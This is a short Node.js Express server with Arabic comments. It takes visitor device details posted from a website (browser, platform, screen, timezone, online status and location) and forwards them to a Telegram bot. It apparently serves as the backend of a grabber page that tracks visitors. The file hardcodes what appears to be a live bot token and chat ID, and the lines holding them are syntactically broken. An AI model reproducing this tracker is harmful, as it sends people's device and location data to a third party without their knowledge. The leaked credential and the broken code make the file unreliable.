const express = require("express");
const fetch = require("node-fetch");

const app = express();
app.use(express.json());

// 🔐 حط التوكن هنا (في Replit Secrets أفضل)
const BOT_TOKEN = process.env.8562912018:AAEEFXCSBqsuj4SHWDWGlTq6Ylr5hBpKvBs;
const CHAT_ID = process.1406662394;

// استقبال البيانات من الموقع
app.post("/send", async (req, res) => {
  
  const data = req.body;

  const message = `
📱 Device Info

🌐 Browser: ${data.browser}
💻 Platform: ${data.platform}
🌍 Language: ${data.language}
📺 Screen: ${data.screen}
🕒 Timezone: ${data.timezone}
📶 Online: ${data.online}
📍 Location: ${data.location || "Denied"}
  `;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });

    res.json({ status: "sent" });

  } catch (err) {
    res.json({ status: "error" });
  }

});

// اختبار السيرفر
app.get("/", (req, res) => {
  res.send("Server is running 🚀");
});

app.listen(3000, () => {
  console.log("Server started");
});